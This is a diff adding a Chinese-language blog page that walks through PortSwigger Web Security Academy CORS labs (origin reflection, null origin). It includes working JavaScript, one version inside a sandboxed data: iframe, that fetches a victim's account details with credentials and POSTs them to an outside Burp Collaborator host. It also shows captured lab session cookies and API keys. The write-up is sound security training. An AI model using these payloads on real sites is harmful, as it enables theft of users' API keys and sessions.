@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 Cross-origin resource sha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy CORS 跨域资源共享">
+<meta property="og:url" content="https://secdroid.github.io/2025/02/16/burp-web-academy-cors-cross-origin-resource-sharing/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 Cross-origin resource sha">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-16T01:55:30.243Z">
+<meta property="article:modified_time" content="2025-02-16T01:55:03.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="CORS">
+<meta property="article:tag" content="Promise">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/02/16/burp-web-academy-cors-cross-origin-resource-sharing/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/02/16/burp-web-academy-cors-cross-origin-resource-sharing/","path":"2025/02/16/burp-web-academy-cors-cross-origin-resource-sharing/","title":"Burp Web Academy CORS 跨域资源共享"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy CORS 跨域资源共享 | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Cross-origin-resource-sharing-CORS"><span class="nav-number">2.</span> <span class="nav-text">0x02. Cross-origin resource sharing (CORS)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-CORS-vulnerability-with-basic-origin-reflection"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: CORS vulnerability with basic origin reflection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-CORS-vulnerability-with-trusted-null-origin"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: CORS vulnerability with trusted null origin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-CORS-vulnerability-with-trusted-insecure-protocols"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: CORS vulnerability with trusted insecure protocols</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-JavaScript-Promise"><span class="nav-number">3.</span> <span class="nav-text">0x03. JavaScript Promise</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%B0%8F%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">0x04. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">5.</span> <span class="nav-text">0x05. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/02/16/burp-web-academy-cors-cross-origin-resource-sharing/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy CORS 跨域资源共享 | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy CORS 跨域资源共享
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-16 09:55:30 / 修改时间：09:55:03" itemprop="dateCreated datePublished" datetime="2025-02-16T09:55:30+08:00">2025-02-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 Cross-origin resource sharing (CORS) 章节（即<strong>跨域资源共享</strong>）。</p>
+<span id="more"></span>
+
+<h2 id="0x02-Cross-origin-resource-sharing-CORS"><a href="#0x02-Cross-origin-resource-sharing-CORS" class="headerlink" title="0x02. Cross-origin resource sharing (CORS)"></a>0x02. Cross-origin resource sharing (CORS)</h2><h3 id="2-1-Lab-CORS-vulnerability-with-basic-origin-reflection"><a href="#2-1-Lab-CORS-vulnerability-with-basic-origin-reflection" class="headerlink" title="2.1 Lab: CORS vulnerability with basic origin reflection"></a>2.1 Lab: CORS vulnerability with basic origin reflection</h3><blockquote>
+<p>This website has an insecure CORS configuration in that it trusts all origins.</p>
+<p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>使用账号密码登录进入 <code>/my-account</code> 页面，即可看到 API Key。或者，也可以通过 <code>GET /accountDetails</code> 来得到包含 API Key 的 JSON 数据。</p>
+<p>在访问 <code>/accountDetails</code> 时，返回的 HTTP Response Header 中包含 <code>Access-Control-Allow-Credentials: true</code>，表明允许跨域访问时携带 Cookie。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>149</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;wiener&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;apikey&quot;</span>: <span class="string">&quot;z673hoKkrrrxrEBauO7NulEuuJ69XwiX&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;sessions&quot;</span>: [</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;fhUcNQSnHozdmfSnus3daqN4jl53hSZd&quot;</span></span></span><br><span class="line"><span class="language-prolog">  ]</span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果在请求头中增加 <code>Origin: https://attacker.com</code>，则服务器响应头包含 <code>Access-Control-Allow-Origin: https://attacker.com</code>，说明存在 CORS 漏洞。</p>
+<p>完整利用代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://0a6600760362c5858020171e00970093.web-security-academy.net/accountDetails&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Network response was not ok&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://urpcjg3yiaie79tyud0uaco5ww2nqde2.oastify.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)&#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>官方解法用的 <code>XMLHttpRequest</code> 配合 Exploit-Server 的访问日志，我这里使用的是 <code>fetch</code> 配合 <a href="https://secdroid.github.io/2025/01/02/burp-web-academy-os-command-injection/">Burp Collaborator</a>。说说遇到的问题：最开始在 <code>fetch /accountDetails</code> 时，指定了 <code>mode: &#39;no-cors&#39;</code>，此时尽管成功触发了请求，但是读不到返回信息：</p>
+<ul>
+<li>response.ok 是 false</li>
+<li>response.status 是 0</li>
+</ul>
+<p>而尝试给 <code>fetch</code> 增加 <code>headers</code> 指定 <code>Origin</code> 字段也没有用，因为根据 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Headers">fetch headers</a> 的描述，<code>Origin</code> 属于 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name">Forbidden header name</a>，即无法通过代码指定。后来发现，去掉 <code>mode: &#39;no-cors&#39;</code> 就可以了，回顾 <a href="https://secdroid.github.io/2025/02/15/burp-web-academy-websockets/">Burp Web Academy WebSockets</a>，可知 <code>mode</code> 支持的设定如下：</p>
+<ul>
+<li><code>mode</code> 用于指明请求是否可以跨域<ul>
+<li><code>cors</code> 是默认模式，表明遵守 <code>CORS</code> 设定</li>
+<li><code>same-origin</code> 标识完全禁止跨域请求</li>
+<li><code>no-cors</code> 标识忽略 <code>CORS</code> 设定，一旦使用该设定，就不允许访问 Response 了，这也是为什么读不到 <code>response.ok</code> 了</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>Setting <code>mode</code> to <code>no-cors</code> disables CORS for cross-origin requests. This restricts the headers that may be set, and restricts methods to GET, HEAD, and POST. The response is <em>opaque</em>, meaning that its headers and body are not available to JavaScript. Most of the time a website should not use <code>no-cors</code>: the main application of it is for certain service worker use cases.</p>
+</blockquote>
+<p>而默认情况下，<code>mode</code> 为 <code>cors</code>，表明遵守 CORS 设定；而 Header 中的 <code>Origin</code> 则由浏览器自动设定，因此是可以利用 CORS 漏洞的。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/accountDetails</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a6600760362c5858020171e00970093.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=fhUcNQSnHozdmfSnus3daqN4jl53hSZd</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://exploit-0a0f006e0341c5b680a816af013e00dc.exploit-server.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://exploit-0a0f006e0341c5b680a816af013e00dc.exploit-server.net</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>149</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Lab-CORS-vulnerability-with-trusted-null-origin"><a href="#2-2-Lab-CORS-vulnerability-with-trusted-null-origin" class="headerlink" title="2.2 Lab: CORS vulnerability with trusted null origin"></a>2.2 Lab: CORS vulnerability with trusted null origin</h3><blockquote>
+<p>This website has an insecure CORS configuration in that it trusts the “null” origin.</p>
+<p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>使用账号密码登陆后，为 <code>/accountDetails</code> 请求增加 <code>Origin: https://attacker.com</code>，并重放：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/accountDetails</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a55005f032045ba85b0c9d0002d009c.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=TBZyFGvnsYOFuveKpggWJWnBxdI0eTqw</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://attacker.com</span><br></pre></td></tr></table></figure>
+
+<p>得到如下响应：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>149</span><br></pre></td></tr></table></figure>
+
+<p>HTTP Response Header 并没有 <code>Access-Control-Allow-Origin</code> 相关的设置，因此<strong>不支持跨域访问</strong>。</p>
+<p>如果在请求头设定 <code>Origin: null</code>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/accountDetails</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a55005f032045ba85b0c9d0002d009c.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=TBZyFGvnsYOFuveKpggWJWnBxdI0eTqw</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br></pre></td></tr></table></figure>
+
+<p>则返回 <code>Access-Control-Allow-Origin: null</code>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>149</span><br></pre></td></tr></table></figure>
+
+<p>根据 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin">Access-Control-Allow-Origin - HTTP | MDN</a> 文档：</p>
+<blockquote>
+<p><strong>Note:</strong> The value <code>null</code> should not be used. It may seem safe to return <code>Access-Control-Allow-Origin: &quot;null&quot;</code>; however, the origin of resources that use a non-hierarchical scheme (such as <code>data:</code> or <code>file:</code>) and sandboxed documents is serialized as <code>null</code>. Many browsers will grant such documents access to a response with an <code>Access-Control-Allow-Origin: null</code> header, and any origin can create a hostile document with a <code>null</code> origin. Therefore, the <code>null</code> value for the <code>Access-Control-Allow-Origin</code> header should be avoided.</p>
+</blockquote>
+<p>问问 Copilot 如何构造 <code>Origin</code> 为 <code>null</code> 的请求，得知 <code>sandboxed iframe</code> 是可以的，但是 Copilot 给的代码并不正确，没有指定 <code>data:text/html</code>，因此测试时总是没有 <code>Origin: null</code>，我以为是 Chrome 的版本太高了。</p>
+<p>最后构造出如下代码，可以在 Burp 自带的 Chrome 中对自己测试成功（<code>Chrome/105.0.5195.102</code>）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-same-origin&quot;</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  fetch(&#x27;https://0a55005f032045ba85b0c9d0002d009c.web-security-academy.net/accountDetails&#x27;, &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">    method: &#x27;GET&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">    credentials: &#x27;include&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#125;)</span></span></span><br><span class="line"><span class="string"><span class="tag">  .then(response =&gt; &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">    if (!response.ok) &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">      throw new Error(&#x27;Network response was not ok&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="tag">    &#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">    return response.json();</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#125;)</span></span></span><br><span class="line"><span class="string"><span class="tag">  .then(data =&gt; &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">    fetch(&#x27;https://urpcjg3yiaie79tyud0uaco5ww2nqde2.oastify.com&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">        &#123;method: &#x27;POST&#x27;, mode: &#x27;no-cors&#x27;, body: JSON.stringify(data)&#125;);</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#125;)</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不过对于受害者而言，浏览器 UA 提示 <code>Chrome/125.0.0.0</code>，测试一直不成功。但是本地对于 Chrome&#x2F;133 和 Edge&#x2F;133 测试又都是可以的。</p>
+<p>网上有人在 2024 年反馈过仅对 Victim 有效，但是对自身测试无效，现在是反过来了，暂时不清楚是何原因，先搁置了。</p>
+<p><strong>Update</strong>：换个时间点测试，在 Burp Collaborator 中收到了 <code>administrator</code> 的信息：</p>
